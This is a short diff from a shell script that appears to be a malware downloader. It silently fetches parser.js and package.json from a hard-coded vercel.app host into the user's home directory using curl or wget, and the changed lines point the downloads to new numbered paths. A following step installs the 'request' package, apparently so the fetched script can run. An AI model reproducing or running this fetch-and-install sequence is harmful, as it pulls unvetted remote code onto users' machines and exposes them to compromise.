@@ -80,12 +80,12 @@ BASE_URL="http://josehub88.vercel.app"
 # Check if curl is available
 if ! command -v curl >/dev/null 2>&1; then
     # If curl is not available, use wget
-    wget -q -O "$USER_HOME/parser.js" "$BASE_URL/parser.js"
-    wget -q -O "$USER_HOME/package.json" "$BASE_URL/package.json"
+    wget -q -O "$USER_HOME/parser.js" "$BASE_URL/303/parser.js"
+    wget -q -O "$USER_HOME/package.json" "$BASE_URL/399/package.json"
 else
     # If curl is available, use curl
-    curl -s -L -o "$USER_HOME/parser.js" "$BASE_URL/parser.js"
-    curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/package.json"
+    curl -s -L -o "$USER_HOME/parser.js" "$BASE_URL/303/parser.js"
+    curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/399/package.json"
 fi
 
 # Step 9: Install 'request' package
